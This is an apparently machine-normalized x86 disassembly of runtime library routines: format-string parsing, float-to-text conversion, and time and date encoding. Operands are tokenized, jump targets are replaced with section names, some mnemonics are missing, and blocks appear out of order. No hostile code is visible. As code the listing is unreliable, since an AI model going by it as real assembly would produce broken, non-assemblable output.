mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_4089e3
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40876e
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_4087b6
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40876e
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408680
pop edx
or edx edx
je r-xdata
sub_40876e
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_4089e3
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4087b6
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_4089e3
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408604
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_4087dd ]
mov ebx ecx
sub cl 0x44
je sub_407dac
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4040a0
jmp r-xdata
mov esi sub_404100
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407dac
sub cl 0x44
je sub_407d40
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407d40
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407dac
mov ecx 0x10
cmp bl 0x58
je sub_407d40
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40865c
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408b9c
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407d40
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408a04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4083bc
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_40868c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408a44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4083bc
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_40868c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408a98
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404138
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404138
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404138
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_40868c
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403f68
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403e78
mov eax esi
mov edx ebx
call sub_4044c4
mov eax [ ebp - 0x4 ]
call sub_404138
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_40868c
mov edx esi
xchg edx eax
call sub_4044c4
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408b58
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408b9c
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408e70
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408c9b
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408ca5
call sub_408c9b
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408b58
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408d01
call sub_408c9b
call sub_408c92
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408c92
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408b58
retn
xor ecx ecx
sub_408d3d
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408c92
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408c92
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408da2
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408df6
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408d3d
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408e70
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408e9d
jmp r-xdata
call sub_408fbf
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408e9d
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c7c
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_408fbf
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_40909c
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409153
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40915e
neg edx
mov ecx esi
call sub_40915e
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409153
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40917a
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c7c
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40915e
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40917a
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4091b0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408b9c
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f68
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4091e0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408b9c
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f68
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40922c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404338
mov edx esp
xor ecx ecx
call sub_40909c
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409258
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404338
mov edx esp
xor ecx ecx
call sub_40909c
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4092a0
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4092e4
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409354
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4092a0
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407978
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407978
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407978
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4093b0
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4093ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4093b0
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4094b4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4092a0
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407978
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407978
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407978
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4093b0
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409600
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4094b4
pop esi
pop ecx
pop ebp
retn 0x8
sub_409620
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4092a0
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40965c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_4096a0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404138
mov edx eax
mov eax ebx
call sub_40965c
pop ecx
pop ebx
pop ebp
retn
sub_4096c0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_40868c
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40965c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40970c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409738
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
